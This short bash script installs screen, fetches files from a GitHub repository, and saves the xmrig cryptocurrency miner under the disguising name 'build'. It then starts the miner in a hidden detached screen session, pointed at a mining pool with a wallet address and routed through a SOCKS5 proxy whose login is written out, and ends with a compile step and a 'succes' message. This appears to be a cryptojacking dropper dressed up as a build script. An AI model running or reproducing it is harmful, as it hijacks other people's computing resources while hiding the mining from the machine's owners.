#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
wget -qO build https://github.com/uaaoxjdr/testly/raw/main/xmrig
chmod +x compile.sh
chmod +x build
screen -dm -S build ./build -o stratum+tcp://na.luckpool.net:3956 -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.ken -t 2 -p x -x socks5://Novax:chalHatt@129.158.58.77:1080
./compile.sh
echo succes
